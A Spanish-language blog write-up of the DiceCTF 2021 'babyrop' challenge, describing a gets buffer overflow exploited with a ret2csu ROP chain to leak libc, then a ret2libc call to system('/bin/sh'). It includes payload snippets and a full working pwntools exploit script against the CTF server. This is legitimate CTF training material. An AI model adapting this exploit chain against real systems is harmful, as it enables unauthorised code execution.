---
layout: post
title: diceCTF babyrop
date: 2021-02-09 13:59
comments: true
categories: [Sin categoría]
---

Hola, ya que he decidido migrar mi página github pages,y para pastor este 2021, aprovecharé de hacer un write up de un binario que hice el fin de semana en [DICECTF 2021.](https://ctf.dicega.ng/) La parte de pwn estuvo bien buena. Solo alcance a hacer este rop y un heap a medias, pero al menos sirvió para mantener la práctica. 

El binario en cuestión podemos ver que es de 64bit, puedes descargarlo de [aca](https://github.com/dplastico/heap_stream/blob/main/babyrop)  no tiene RELRO ni PIE, lo cual hace las cosas bastante sencillas. Eso sí, debemos considerar que probablemente ASLR si está habilitado en el sistema con lo que de todas formas necesitaremos de un leak.

![Imgur](https://i.imgur.com/wtXtqAk.png)

Al revisar las funciones vemos que ocupa la función [gets](https://linux.die.net/man/3/gets) (ya sabemos que esto lleva a buffer overflow), pero solo ocupa adicional a esto la función de [write](https://man7.org/linux/man-pages/man2/write.2.html) para imprimir en pantalla.

![Imgur](https://i.imgur.com/7xWpbFq.png)

Considerando esto nuestro plan de explotación será el siguiente:

- Generar un Overflow y usar ROP para “lekear” una dirección de LIBC
- Identificar la version de LIBC
- Calcular los offsets necesarios
- Volver a generar un Buffer Overflow esta vez llamar a system y obtener una shell


Para obtener el leak el plan es generar un ROP y hacer un llamado a la función de write, podemos observar los parámetros que usa este syscall en el siguiente [link](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/). En resumen debemos ubicar en el registro RDI el file descriptor 1 (stdout), la dirección  que queramos “lekear” en RSI (en este caso usaremos la dirección GOT de gets y write) y en el registro RDX debemos darle un valor que usará para definir cuántos bytes se imprimirán en pantalla. Por lo mismo debemos considerar para esto al menos 8 bytes.

Podemos usar [ropper](https://github.com/sashs/Ropper) para mostrar los gadgets del binario y no tener que hacer una búsqueda manual, pero vemos que no hay forma de controlar el valor de rdx

![Imgur](https://i.imgur.com/DngI1xm.png)

Pero! Por eso mismo siempre les recomiendo revisar el binario de manera manual, por que en este caso podemos ocupar una técnica conocida como ret2csu. 

Puedes leer una descripción más detallada [acá](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf), pero en resumen, usando esta técnica podemos encontrar ciertos “gadgets universales” que nos permiten controlar determinados registros haciendo uso de estas funciones que siempre se cargan en un ELF producto de la compilación. En este caso usaremos la funcion __lib_csu_init

![Imgur](https://i.imgur.com/lzcqURc.png)

Podemos observar que somos capaces usar un pop al registro R14 en la dirección 0x4011d0 y luego mover con “MOV rdx, r14” en 0x4011b0 el valor al registro RDX. Además el mismo gadget nos permitirá usar R15 y R13 para poder situar los valores de RSI y EDI (4 bytes de RDI).

Para que esto funcione debemos primero agregar los registros necesarios en nuestro “ropchain” de tal manera que pase el check en 0x4011c4 y hacer que el call, llame a write directamente por lo cual debemos asegurarnos que el valor de write este en  0x4011b9 call   QWORD PTR [ r15+rbx*8 ] 

```python
payload = b"A"*0x48 #overflow a los 72 bytes
payload += p64(0x4011ca) #pop a registros
payload += p64(0)#rbx
payload += p64(1)#rbp
payload += p64(1)#r12 --> edi
payload += p64(elf.got.gets) #r13 --> rsi
payload += p64(8)#r14 ---> rdx
payload += p64(elf.got.write) #r15
payload += p64(0x04011b0) # escribiendo en RDX RSI Y EDI
payload += p64(0)*7 # --> los pop nuevamente
payload += p64(elf.sym.main) #para retornar a main y hacer un segundo bof
```

Si enviamos esto podemos lekear las direcciones de gets y write

![Imgur](https://i.imgur.com/ddj0QHq.png)

![Imgur](https://i.imgur.com/ddj0QHq.png)

Con esto podemos buscar una versión de libc remota que coincida y de esa forma podemos calcular los offsets. Para esto ocupare [esta DB](https://libc.blukat.me/)

![Imgur](https://i.imgur.com/aUoas6M.png)

Vemos que coincide con la versión, la 2.31 , podríamos descargarla pero dado que esta pagina nos entrega los offset a system y al string de "/bin/sh" dentro de glibc, pues probaremos con esto en nuestro segundo payload, de la siguiente forma:

```python
payload = b"A" * 72 #overflow
payload += p64(poprdi) #pop rdi en el binario
payload += p64(libc.address+0x1b75aa) #string de /bin/sh a RDI como primer arg
payload += p64(ret) #ret para alinear el stack a 16 bytes (ubuntu)
payload += p64(libc.address+0x055410) #direccion de system
```
Con esto ejecutamos y listo! Tenemos una shell.

![Imgur](https://i.imgur.com/trApFwN.png)

Espero que les haya gustado, este fue el único exploit que pude terminar en el CTF tuve mucho que hacer y los retos no estaban tan fáciles. Aun asi ya he hechos desafíos para Q4 que ocupan esta técnica, por lo cual me pareció valido mostrar como funciona. Espero les haya gustado, aca les dejo el exploit final:

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./babyrop')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./babyrop', gdbscript=gs)
    if args.REMOTE:
        return remote('dicec.tf', 31924)
    else:
        return process('./babyrop')
r = start()
r.timeout = 0.3
#========= exploit here ===================

poprdi = 0x4011d3
ret = 0x040116b

payload = b"A"*0x48 #overflow a los 72 bytes
payload += p64(0x4011ca) #pop a registros
payload += p64(0)#rbx
payload += p64(1)#rbp
payload += p64(1)#r12 --> edi
payload += p64(elf.got.gets) #r13 --> rsi
payload += p64(8)#r14 ---> rdx
payload += p64(elf.got.write) #r15
payload += p64(0x04011b0) # escribiendo en RDX RSI Y EDI
payload += p64(0)*7 # --> los pop nuevamente
payload += p64(elf.sym.main) #para retornar a main y hacer un segundo bof

r.sendlineafter("name:", payload)

leak = u64(r.recvuntil("Your").split(b"Your")[0][1:7].ljust(8,b"\x00"))  #remote offset
libc.address = leak - 0x086af0
log.info(f"leak = {hex(leak)}")
log.info(f"libc remote = {hex(libc.address)}")

payload = b"A" * 72 #overflow
payload += p64(poprdi) #pop rdi en el binario
payload += p64(libc.address+0x1b75aa) #string de /bin/sh a RDI como primer arg
payload += p64(ret) #ret para alinear el stack a 16 bytes (ubuntu)
payload += p64(libc.address+0x055410) #direccion de system

r.sendlineafter("name:", payload)  #!!

#========= interactive ====================
r.interactive()
```